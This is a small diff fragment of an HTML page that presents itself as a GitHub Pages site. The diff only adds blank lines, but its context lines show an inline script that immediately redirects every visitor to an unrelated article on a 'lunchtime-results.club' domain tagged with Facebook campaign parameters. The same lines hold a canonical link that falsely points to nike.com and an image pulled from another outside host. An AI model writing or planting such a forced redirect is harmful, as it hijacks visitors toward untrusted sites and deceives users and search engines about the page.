@@ -3,6 +3,9 @@
 <link rel="canonical" href="http://nike.com/" />
 <script type="text/javascript">window.location = "https://lunchtime-results.club/2021/05/15/how-much-does-it-cost-to-study/?utm_source=facebook&utm_medium=Cobra&utm_campaign=Cobra";</script>
 </head>
+
+
+
 <p><img src="https://dcloudweb.com/wp-content/uploads/2021/06/447_1000.jpg" alt="loading"></p>
 
 ## Welcome to GitHub Pages
